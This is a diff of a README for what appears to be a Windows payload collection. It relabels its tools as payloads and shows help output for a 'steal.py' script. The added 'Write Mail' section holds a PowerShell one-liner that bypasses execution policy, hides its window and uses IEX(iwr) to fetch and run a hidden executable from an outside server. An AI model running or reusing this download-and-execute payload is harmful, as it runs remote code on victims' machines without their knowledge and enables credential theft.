@@ -4,10 +4,22 @@
 > Any illegal activities are strictly forbidden.
 
 
-# Tools
+# Payloads
+
+<picture>
+  <source
+    srcset="assets/PayloadsDark.png"
+    media="(prefers-color-scheme: dark)"
+  />
+  <source
+    srcset="assets/Payloads.png"
+    media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
+  />
+  <img src="assets/Payloads.png" />
+</picture>
 
 > **Note** \
-> all tools target and have been tested for Windows
+> all code target and have been tested for Windows
 
 ## URL shortener
 Shortens an url with only "safe" characters for the domain [is.gd](https://is.gd)
@@ -51,6 +63,8 @@ if __name__ == "__main__":
 ```
 
 </details>
+
+# Payload 2
 
 ## Rickroll (powershell)
 - opens MS Edge on url
@@ -234,6 +248,12 @@ python steal.py -h
 #   -h, --help  show this help message and exit
 #   --headfull  open a window for edge
 #   --cc CC
+```
+
+### Write Mail
+set up is similar to the other build
+```shell
+powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
 ```
 
 ## Acknowledgments
